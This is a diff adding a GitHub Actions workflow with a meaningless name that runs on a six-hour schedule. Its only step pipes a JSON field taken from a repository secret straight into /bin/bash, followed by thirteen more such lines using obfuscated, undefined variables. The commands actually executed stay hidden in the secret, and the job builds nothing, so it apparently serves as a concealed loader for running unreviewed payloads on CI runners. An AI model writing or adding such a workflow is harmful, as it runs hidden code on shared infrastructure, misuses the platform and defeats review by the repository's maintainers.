@@ -1,0 +1,31 @@
+name: brashslovenly
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: brashslovenly
+        env:
+          lrn48782: ${{ secrets.lrn48782 }}
+        run: |
+          echo $lrn48782 | jq -r .m28 | /bin/bash
+          echo $euwjh12 | jq -r .lei14 | /bin/bash
+          echo $xbvh24464 | jq -r .z3428 | /bin/bash
+          echo $lngq84070 | jq -r .u522 | /bin/bash
+          echo $sems18 | jq -r .zsivh3 | /bin/bash
+          echo $igkhi13 | jq -r .psfm20 | /bin/bash
+          echo $lynjv20345 | jq -r .ver72215 | /bin/bash
+          echo $a66 | jq -r .nlzpy95446 | /bin/bash
+          echo $sq276 | jq -r .vbqtg87462 | /bin/bash
+          echo $minnd3 | jq -r .pvge3 | /bin/bash
+          echo $zz22171 | jq -r .n3 | /bin/bash
+          echo $qhxrp6042 | jq -r .qi1 | /bin/bash
+          echo $u875 | jq -r .rkr62 | /bin/bash
+          echo $wielp04197 | jq -r .klnct37463 | /bin/bash
+
